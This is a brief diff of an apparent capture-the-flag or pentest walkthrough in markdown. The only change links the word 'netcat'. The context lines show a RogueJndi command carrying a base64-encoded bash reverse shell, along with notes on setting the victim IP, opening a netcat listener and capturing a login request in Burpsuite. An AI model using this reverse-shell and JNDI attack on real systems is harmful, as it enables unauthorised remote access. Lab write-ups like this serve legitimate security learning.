@@ -77,7 +77,7 @@ java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtY
 # In the bash command, copy paste your reverse shell in base64
 # --hostname: Victim IP
 
-# Now, open a terminal, launch netcat abd the listening port you defined in your payload.
+# Now, open a terminal, launch [[netcat]] abd the listening port you defined in your payload.
 ```
 
 With Burpsuite, get a request for login:
